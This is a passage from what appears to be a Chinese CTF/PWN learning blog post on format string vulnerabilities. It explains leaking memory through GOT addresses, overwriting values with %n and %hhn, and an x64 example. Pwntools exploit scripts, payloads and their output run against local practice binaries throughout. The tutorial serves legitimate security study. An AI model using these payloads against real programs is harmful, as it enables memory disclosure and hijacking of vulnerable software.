+<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>有时我们需要泄露某个libc函数的got表内容，从而的到其地址，进而获取libc版本以及其他函数的地址，这时候能够完全控制泄露某个指定地址的内存就很重要了。一般来说在格式化字符漏洞中，我们读取的格式化字符串都在栈上。也就是说在调用输出函数的时候，其实第一个参数的值其实就是该格式化字符串的地址。</p>
+<p>由于我们可以控制格式化字符串，如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设改格式化字符串相对函数调用为第K个参数。那么就可以通过如下 的方式来获取某个指定地址addr的内容</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure>
+
+<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">AAAA<span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span>.......<br></code></pre></td></tr></table></figure>
+
+<p>还是用上面的程序，试着运行一下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span>-<span class="hljs-number">0</span>xffdb1e20-<span class="hljs-number">0</span>xec2bd7b0-<span class="hljs-number">0</span>x804919d-<span class="hljs-number">0</span>x41414141-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<span class="hljs-number">0</span>x70252d70-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<span class="hljs-number">0</span>x70252d70-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<span class="hljs-number">0</span>x70252d70-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<br></code></pre></td></tr></table></figure>
+
+<p>我们主要注意<code>0x4141414</code>是相对于AAAA第几个出现的，这里是第4个，那么，我们就可以用<code>AAAA%4$p</code>来直接输出<code>0x41414141</code>。综上所述，如果我们如果将AAAA替换成某个函数的got地址，那么程序就会打印出这个函数的真实地址。我们拿scanf函数举例，获取函数got地址就交给我们的，例如如下这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = elf.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>] <span class="hljs-comment">#获取scanf函数的got地址</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span> <span class="hljs-comment">#将AAAA%4$p中的A替换成scanf函数的got地址</span><br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>那么，我们为什么要确定格式化字符是printf的第几个参数呢？其实很简单：格式化字符串存在栈帧内，当printf函数需要依据格式化字符串来进行输出的时候，printf函数先会根据在栈顶附近存放的格式化字符串地址去找格式化字符串，比如-098 0xffffd030 —▸ 0x804a00b ◂— ‘%08x.%08x.%08x.%s\n’，其中0xffffd030是栈顶附近某个内存的地址，其中存放了储存了格式化字符串的内存的地址，就是0x804a00b。同时，存放格式化字符串的内存地址处于高地址（比较靠近栈底），所以，在printf函数依据格式化字符串在栈帧内从低到高输出栈内数据时，如果该程序存在格式化字符串漏洞，那么printf就会输出储存在栈帧内的格式化字符串。</p>
+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>利用占位符<code>%n</code>，我们可以实现修改栈上的值。<code>%n</code>的用法如下</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[覆盖的地址]</span> %<span class="hljs-selector-attr">[偏移]</span>n<br></code></pre></td></tr></table></figure>
+
+<p>而覆盖的内容，就是上一次输出的长度，比如程序上一次输出的内容大小是4个字节，那么<code>%n</code>会向这个地址中写入’4’</p>
+<h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>这是一个exp，下面要用到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) <span class="hljs-comment">#获取c变量的地址</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span> <span class="hljs-comment">#构建payload</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>什么是小数字，怎么个小法呢？其实是小于极其字长，我们知道，<code>%n</code>会根据上一次输出的字节数存入对应地址当中，但是在实际的做题中，我们一般会在<code>%kn</code>之前通过p32小端序转化地址，一个地址，比如<code>0xdeadbeef</code>，本身长一字节，但是经过p32转化后便会变成4字节，所以说，利用这种方法写入内存的额数字最小就是4，如果需要比4小的数字，例如2，就需要如下的办法。</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;aa%knaa&#x27;</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p>通过将p32放到<code>%n</code>后来解决，但是这样写还是不太对，真正正确的是如下的写法：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;aa%k&#x27;</span> + <span class="hljs-string">&#x27;$naa&#x27;</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p>我们通过吧前面的字符串拆分成两个部分，每部分4字节（一共4个字符，一个字符占1字节），因为格式化字符串是第6个参数，所以<code>aa%k</code>是第六个，<code>$naa</code>是第7个， <code>p32(a_addr)</code>是第8个，所以这里的k需要改成8，这样，<code>%n</code>会将<code>aa</code>这两个字符的字符数写在第8个参数，即变量a的地址中。</p>
+<h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>有时候，我们需要在一个地址中来存放另一个地址，地址一般是0x12345678这种格式的，换算成十进制化，就是305419896个字节，这个数字就非常大了，大概是291.27MB，可能栈都没这个字符串大。</p>
+<p>但是，我们可以换个思路，我么一定要一次性注入吗？要知道，地址是16进制数，大小一般为4字节，而在32和64位系统中，数据一般按照小端储存，就是高位数字放在低地址，低位数字放在高地址，比如说0x456789AB，他在内存中的样子其实是这样的:</p>
+<table>
+<thead>
+<tr>
+<th>高地址</th>
+<th>0xAB</th>
+<th>0x89</th>
+<th>0x67</th>
+<th>0x45</th>
+<th>低地址</th>
+</tr>
+</thead>
+</table>
+<p>综上所述，我们其实可以一字节，一字节地填充。</p>
+<p>要使用这种方法，我们需要知道格式化字符串里面的两个标识符，<code>h</code>和<code>hh</code>，简单来说，如果我们使用了</p>
+<p><code>h</code>标志，那么就会向变量b中一次性写两个字节，写两次填满。使用<code>hh</code>标志位会向变量b中一次性写一个字节，写四次填满。这里我们用<code>hh</code>。</p>
+<p>所以，我们将要填充的地址，假设为<code>addr~addr+4</code>，数字是<code>0x12345678</code>。我们依然依据上面的那个exp，格式化字符串是printf的第六个参数，我们只需要把如果将addr放在格式化字符串的第6个参数位置、addr + 1放在第7个参数位置、addr + 2放在第8个参数位置、addr + 3放在第9个参数位置。再通过%6$hhn、%7$hhn、%8$hhn、%9$hhn将0x78、0x56、0x34、0x12写进去就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p32(b_addr)+p32(b_addr+<span class="hljs-number">1</span>)+p32(b_addr+<span class="hljs-number">2</span>)+p32(b_addr+<span class="hljs-number">3</span>)<br>payload += <span class="hljs-string">&#x27;%104x&#x27;</span>+<span class="hljs-string">&#x27;%6$hhn&#x27;</span>+<span class="hljs-string">&#x27;%222x&#x27;</span>+<span class="hljs-string">&#x27;%7$hhn&#x27;</span>+<span class="hljs-string">&#x27;%222x&#x27;</span>+<span class="hljs-string">&#x27;%8$hhn&#x27;</span>+<span class="hljs-string">&#x27;%222x&#x27;</span>+<span class="hljs-string">&#x27;%9$hhn&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>前面的四个p32每个占4字节，一共16个字节，%104x占104个字节，所以104 + 16 &#x3D; 120 &#x3D;0x78，所以%6$hhn会将0x78写到第6个参数，即addr的位置</li>
+<li>%222x占222个字节，再加上前面的字节数：120 + 222 &#x3D; 342 &#x3D; 0x156，因为hh是单字节，所以只取后面的0x56，所以%7$hhn会将0x56写到第7个参数，即addr+1的位置</li>
+<li>剩下的以此类推</li>
+</ul>
+<p>这样，我们就完成了大数字的填充。</p>
+<hr>
+<h1 id="格式化漏洞（x64）"><a href="#格式化漏洞（x64）" class="headerlink" title="格式化漏洞（x64）"></a>格式化漏洞（x64）</h1><p>学习参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/rvnk0g#">https://www.yuque.com/cyberangel/rg9gdm/rvnk0g#</a></p>
+<p>这个文章中有下面要用的示例，但是在实操前，需要在示例的同目录下创建一个flag.txt文件，并在文件中填充一点内容，比如<code>flag&#123;th1s_is_@_fl4g&#125;</code></p>
+<h2 id="64与32的区别"><a href="#64与32的区别" class="headerlink" title="64与32的区别"></a>64与32的区别</h2><p>64位格式化字符串和32位的很相似，做题的步骤也相同，唯一不同的是64位程序对函数参数存储的方式和32位的不同。64为程序会优先将函数的前6个参数放置在寄存器中，超过6个的再存放在栈上，而32位直接存放在栈上。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>先查一下保护， 开启了NX保护和Canary保护，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:       amd64-64-little<br>RELRO:      Partial RELRO<br>Stack:      Canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x400000)<br>Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>先运行一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./goodluck<br>what<span class="hljs-string">&#x27;s the flag</span><br><span class="hljs-string">114514</span><br><span class="hljs-string">You answered:</span><br><span class="hljs-string">114514</span><br><span class="hljs-string">But that was totally wrong lol get rekt</span><br></code></pre></td></tr></table></figure>
+
+<p>再看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+3h] [rbp-3Dh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *format; <span class="hljs-comment">// [rsp+8h] [rbp-38h] BYREF</span><br>  _IO_FILE *fp; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  _BYTE v10[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v11 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  fp = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">21</span>; ++i )<br>    v10[i] = _IO_getc(fp);<br>  fclose(fp);<br>  v9 = v10;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what&#x27;s the flag&quot;</span>);<br>  fflush(_bss_start);<br>  format = <span class="hljs-number">0LL</span>;<br>  __isoc99_scanf(<span class="hljs-string">&quot;%ms&quot;</span>, &amp;format);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">21</span>; ++j )<br>  &#123;<br>    v4 = format[j];<br>    <span class="hljs-keyword">if</span> ( !v4 || v10[j] != v4 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You answered:&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(format);		&lt;--<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);<br>      fflush(_bss_start);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);<br>  fflush(_bss_start);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到，再<code>puts(&quot;You answered:&quot;);</code>语句下面的<code>printf(format);</code>语句没有格式化字符串，存在格式化字符串漏洞。</p>
+<p>接下来我们用gdb动调。</p>
+<ol>
+<li><p>首先，我们先对<code>printf</code>函数下断点</p>
+</li>
+<li><p>然后运行一下</p>
+</li>
+<li><p>程序终端在<code>printf</code>处，我们知道，64位的传参顺序先是6个寄存器，然后才是栈。</p>
+</li>
+<li><p>我们先看一眼寄存器（箭头是我自己加的，gdb没有）</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">RAX</span>  <span class="hljs-number">0</span><br><span class="hljs-built_in">RBX</span>  <span class="hljs-number">0</span><br>--&gt; <span class="hljs-built_in">RCX</span>  <span class="hljs-number">0x7ffff7d14887</span> (write+<span class="hljs-number">23</span>) ◂— <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, -<span class="hljs-number">0x1000</span> /* <span class="hljs-string">&#x27;H=&#x27;</span> */<br>--&gt; <span class="hljs-built_in">RDX</span>  <span class="hljs-number">1</span><br>--&gt; <span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x602ca0</span> ◂— <span class="hljs-number">0x343135343131</span> /* <span class="hljs-string">&#x27;114514&#x27;</span> */<br>--&gt; <span class="hljs-built_in">RSI</span>  <span class="hljs-number">1</span><br>--&gt; <span class="hljs-built_in">R8</span>   <span class="hljs-number">0x7ffff7e1ca70</span> (_IO_stdfile_1_lock) ◂— <span class="hljs-number">0</span><br>--&gt; <span class="hljs-built_in">R9</span>   <span class="hljs-number">0x602ca0</span> ◂— <span class="hljs-number">0x343135343131</span> /* <span class="hljs-string">&#x27;114514&#x27;</span> */<br><span class="hljs-built_in">R10</span>  <span class="hljs-number">0x7ffff7c15cc0</span> ◂— <span class="hljs-number">0xf00120000481e</span><br><span class="hljs-built_in">R11</span>  <span class="hljs-number">0x7ffff7c606f0</span> (printf) ◂— endbr64 <br><span class="hljs-built_in">R12</span>  <span class="hljs-number">0x7fffffffdfe8</span> —▸ <span class="hljs-number">0x7fffffffe355</span> ◂— <span class="hljs-string">&#x27;/home/xyq/test/goodluck&#x27;</span><br><span class="hljs-built_in">R13</span>  <span class="hljs-number">0x4007a6</span> (main) ◂— <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br><span class="hljs-built_in">R14</span>  <span class="hljs-number">0</span><br><span class="hljs-built_in">R15</span>  <span class="hljs-number">0x7ffff7ffd040</span> (_rtld_global) —▸ <span class="hljs-number">0x7ffff7ffe2e0</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7fffffffded0</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7fffffffde88</span> —▸ <span class="hljs-number">0x400890</span> (main+<span class="hljs-number">234</span>) ◂— <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edi</span>, <span class="hljs-number">0x4009b8</span><br><span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x7ffff7c606f0</span> (printf) ◂— endbr64 <br></code></pre></td></tr></table></figure>
+
+<p>再看栈</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0</span>x7fffffffde88 —▸ <span class="hljs-number">0</span>x400890 (main+<span class="hljs-number">234</span>) ◂— mov edi, <span class="hljs-number">0</span>x4009b8<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">040</span> <span class="hljs-number">0</span>x7fffffffde90 ◂— <span class="hljs-number">0</span>x31fc1000<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">038</span> <span class="hljs-number">0</span>x7fffffffde98 —▸ <span class="hljs-number">0</span>x602ca0 ◂— <span class="hljs-number">0</span>x343135343131 /* &#x27;<span class="hljs-number">114514</span>&#x27; */<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">030</span> <span class="hljs-number">0</span>x7fffffffdea0 —▸ <span class="hljs-number">0</span>x6022a0 ◂— <span class="hljs-number">0</span>x602<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│-<span class="hljs-number">028</span> <span class="hljs-number">0</span>x7fffffffdea8 —▸ <span class="hljs-number">0</span>x7fffffffdeb0 ◂— <span class="hljs-number">0</span>x3168747b67616c66 (&#x27;flag&#123;th1&#x27;)<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│-<span class="hljs-number">020</span> <span class="hljs-number">0</span>x7fffffffdeb0 ◂— <span class="hljs-number">0</span>x3168747b67616c66 (&#x27;flag&#123;th1&#x27;)<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│-<span class="hljs-number">018</span> <span class="hljs-number">0</span>x7fffffffdeb8 ◂— <span class="hljs-number">0</span>x665f405f73695f73 (&#x27;s_is_@_f&#x27;)<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│-<span class="hljs-number">010</span> <span class="hljs-number">0</span>x7fffffffdec0 ◂— <span class="hljs-number">0</span>xff0a7d67346c<br></code></pre></td></tr></table></figure>
+
+<p>RDI中泛着<code>printf</code>的第一个参数，也就是我们输入的<code>114514</code>，如果输入的是格式化字符串，那就是格式化字符串，剩下的RSI、RDX、RCX、R8、R9这5个寄存器会接着存放其他参数。上面看完了往栈上看，可以看到栈顶为printf函数的返回地址，我们想要的flag在返回地址下的第四个。所以如果我们想要打印flag，那么flag距离格式化字符串的偏移就是5 + 4 &#x3D; 9</p>
+</li>
+<li><p>然后我们就可以构建exp了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-number">2</span> p = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><span class="hljs-number">3</span> payload = <span class="hljs-string">b&quot;%9$s&quot;</span><br><span class="hljs-number">4</span> p.sendline(payload)<br><span class="hljs-number">5</span> p.interactive()：w<span class="hljs-string">&#x27;q</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python3 ./flag.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./goodluck&#x27;</span>: pid 3240<br>[*] Switching to interactive mode<br>[*] Process <span class="hljs-string">&#x27;./goodluck&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 3240)<br>what<span class="hljs-string">&#x27;s the flag</span><br><span class="hljs-string">You answered:</span><br><span class="hljs-string">flag&#123;th1s_is_@_fl4g&#125;</span><br><span class="hljs-string">\xff</span><br><span class="hljs-string">But that was totally wrong lol get rekt</span><br><span class="hljs-string">[*] Got EOF while reading in interactive</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8E%9F%E5%88%9B/" class="print-no-link">#原创</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>格式化字符串漏洞</div>
+      <div>http://example.com/2024/12/07/格式化字符串漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ginat_USB</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/01/22/%E5%9F%BA%E6%9C%ACROP/" title="基本ROP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">基本ROP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
